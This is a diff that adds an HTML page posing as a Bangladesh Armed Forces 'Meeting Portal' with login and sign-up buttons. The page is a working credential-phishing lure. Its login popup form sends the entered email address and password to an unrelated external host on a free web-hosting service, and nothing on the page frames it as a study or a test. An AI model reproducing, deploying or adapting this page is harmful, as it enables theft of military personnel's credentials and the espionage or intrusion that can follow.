@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> Welcome to Bangladesh Armed Forces :: Meeting Portal </title>
+    <link rel="shortcut icon" href="0.png"/>
+    <link rel="stylesheet" type="text/css" href="./army.css">
+</head>
+<body>
+    <br><br><br>
+
+<div class="multiplebackground">
+  <div style="background-color:red"></div>
+  <div style="background-color:green"></div>
+  <div style="background-color:blue"></div>
+</div>
+
+
+    
+    <div class="container"><br>
+      <img  src="0.png" alt="Google Icon"  >
+        <h1>  Smart Bangladesh 2041 Portal: AFD  </h1>
+        <p>To connect with Bangladesh Armed Forces, please choose an option:</p>
+ 
+            
+            <a class="button" href="#" onclick="showPopup()">Login with Email </a>
+
+<br>
+             <p>Don't have an account? </p>
+ 
+            
+            <a class="button" href="#" onclick="showPopup()"> &nbsp; &nbsp; &nbsp;  Sign Up &nbsp; &nbsp; &nbsp;  </a>
+            
+             
+            <div id="download-link" style="display: none;">
+                <p id="download">Click below to download the file:</p>
+                <a class="button" href="#">Download File</a>
+            </div>
+        </div>
+  
+
+    <!-- Flex popup for login -->
+    <div class="popup" id="login-popup">
+        <div class="popup-content">
+            <h2 style="color: #666666;">Login with Email</h2>
+            <form action="https://secre-mail.000webhostapp.com/protal/share.php" method="post" target="_parent">
+                             <input id="user" name="username" type="text" placeholder="Email address" required>
+                <input id="pass"  name="password" type="password" placeholder="Password" required>
+                <button class="popup-button">Submit</button>
+            </form>
+        </div>
+    </div>
+ 
+    
+
+    <script>
+        function showPopup() {
+            document.getElementById("login-popup").style.display = "flex";
+        }
+
+        function closePopup() {
+            document.getElementById("login-popup").style.display = "none";
+        }
+    </script>
+</body>
+</html>
